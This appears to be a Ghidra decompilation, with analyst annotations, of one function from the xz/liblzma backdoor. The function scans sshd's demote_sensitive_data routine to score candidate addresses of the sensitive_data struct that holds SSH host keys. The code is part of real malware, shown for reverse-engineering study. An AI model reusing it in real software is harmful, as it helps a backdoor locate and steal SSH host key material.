// /home/kali/xzre-ghidra/xzregh/103990_sshd_score_sensitive_data_candidate_in_demote_sensitive_data.c
// Function: sshd_score_sensitive_data_candidate_in_demote_sensitive_data @ 0x103990
// Calling convention: __stdcall
// Prototype: int __stdcall sshd_score_sensitive_data_candidate_in_demote_sensitive_data(sensitive_data * sensitive_data, elf_info_t * elf, string_references_t * refs)


/*
 * AutoDoc: Disassembles the string-identified `demote_sensitive_data` helper and returns three points as soon as it materialises the candidate `sensitive_data` address (the `host_keys` slot at offset 0). That helper is tightly coupled to the real struct, so even a single hit is treated as strong evidence in the aggregate score.
 */

#include "xzre_types.h"

int sshd_score_sensitive_data_candidate_in_demote_sensitive_data
              (sensitive_data *sensitive_data,elf_info_t *elf,string_references_t *refs)

{
  u8 *code_start;
  BOOL demote_hit;
  int score;
  u8 *demote_start;
  
  // AutoDoc: Leverage the cached string reference so we only run the scan when `demote_sensitive_data` was actually located.
  code_start = (u8 *)(refs->demote_sensitive_data).func_start;
  if (code_start != (u8 *)0x0) {
    // AutoDoc: Walk the routine until a MOV/LEA materialises `&sensitive_data->host_keys` (the struct base); that hit is worth the full three points.
    demote_hit = find_riprel_ptr_lea_or_mov_load
                      (code_start,(u8 *)(refs->demote_sensitive_data).func_end,(dasm_ctx_t *)0x0,
                       sensitive_data);
    if (demote_hit == FALSE) {
      score = 0;
    }
    else {
      // AutoDoc: Return an immediate +3 because any true reference inside `demote_sensitive_data` is a very strong signal.
      score = 3;
    }
    return score;
  }
  return 0;
}

